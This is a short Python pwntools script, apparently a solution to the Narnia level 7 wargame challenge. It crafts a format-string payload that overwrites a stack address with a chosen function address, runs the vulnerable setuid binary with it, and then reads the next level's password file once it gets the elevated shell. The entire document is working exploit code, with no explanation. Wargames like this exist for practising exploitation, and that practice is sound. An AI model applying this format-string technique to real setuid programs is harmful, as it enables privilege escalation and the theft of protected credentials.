from pwn import *

payload = fmtstr_payload(2, {0xffffd608 : 0x8048724})

p = process([b'/narnia/narnia7', payload])
p.recvuntil(b'Way to go!!!!')
p.sendline(b'cat /etc/narnia_pass/narnia8')
print('\nnarnia8 pass: ' + p.recvline().decode())

p.close()